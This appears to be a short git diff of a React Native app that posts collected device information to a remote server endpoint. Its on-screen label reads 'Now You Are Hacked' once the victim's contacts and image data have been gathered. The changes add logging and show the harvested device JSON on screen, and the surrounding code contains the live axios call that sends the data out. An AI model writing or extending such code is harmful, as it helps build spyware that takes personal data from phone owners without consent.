@@ -42,6 +42,7 @@ const App = () => {
 
 
   const send_DeviceInfo = () => {
+    console.log("CALL")
     let data = deviceJSON ? deviceJSON : {}
     axios.post(`${SERVER_URL}/client`, data)
       .then(function (response) {
@@ -253,8 +254,8 @@ const App = () => {
     //   </View>
     // </SafeAreaView>
     <View style={{ backgroundColor: '#000', flex: 1 }}>
-      <Text style={{ fontSize: 9, color: (contacts && imageData) ? "#222" : 'green' }}>Now You Are {(contacts && imageData) ? "Hacked" : "Safe"}</Text>
-      <Text>Your Device Id is {deviceId ? deviceId : null}</Text>
+      <Text style={{ fontSize: 9, color: (contacts && imageData) ? "#fff" : 'green' }}>Now You Are {(contacts && imageData) ? "Hacked" : "Safe"}</Text>
+      <Text style={{color: 'red'}}> {deviceJSON ? JSON.stringify(deviceJSON) : ''}</Text>
     </View>
   );
 }
